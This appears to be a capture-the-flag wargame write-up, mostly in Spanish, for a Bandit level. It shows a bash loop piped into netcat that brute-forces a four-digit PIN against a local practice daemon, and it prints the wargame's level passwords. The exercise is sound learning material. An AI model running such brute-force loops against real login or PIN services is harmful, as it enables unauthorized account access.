## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

# Solution
Tenemos que comprobar todas las posibles combinaciones. Una de ellas si ponemos la contraseña de bandit24 y el pin como indica nos dará la contraseña de bandit25.

**Importante:** Podemos inyectar unos strings directamente a la connexión:
```sh
bandit24@bandit:/tmp/tmp.N95yqcedQe$ echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 1234" | nc 127.0.0.1 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct current password and pincode. Try again.
```
Para ellos podemos generar todas las combinaciones y aplicar el output a la conexión:
```sh
bandit24@bandit:/tmp/tmp.N95yqcedQe$ for pin in {0000..9999};do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"; done | nc 127.0.0.1 30002 | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

```
De este modo hacemos un for loop que genera un echo para todas las combinaciones entre 0000 y 9999. Ese echo generado se pasa a la conexión. Como cuando es erróneo nos proporciona la frase: *Wrong! Please enter the correct current password and pincode. Try again.* Aplicamos un grep -v para quitar las lineas con la palabra wong.

Si queremos saber el pin podemos saber las lineas que genera el output. Sabiendo que las lineas que queremos son las que dan "Wrong" podemos contar esas lineas quitando solamente las correctas:
```sh
bandit24@bandit:/tmp/tmp.N95yqcedQe$ for pin in {0000..9999};do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"; done | nc 127.0.0.1 30002 | grep -vE "bandit25|Correct" | wc -l
3948
```
OJO: el ouput genera una línea vacía al final que la cuenta. Por lo tanto sería **3948-1=3947**

# Password next level:

iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

## Next level:
[[Level 25 -> 26]]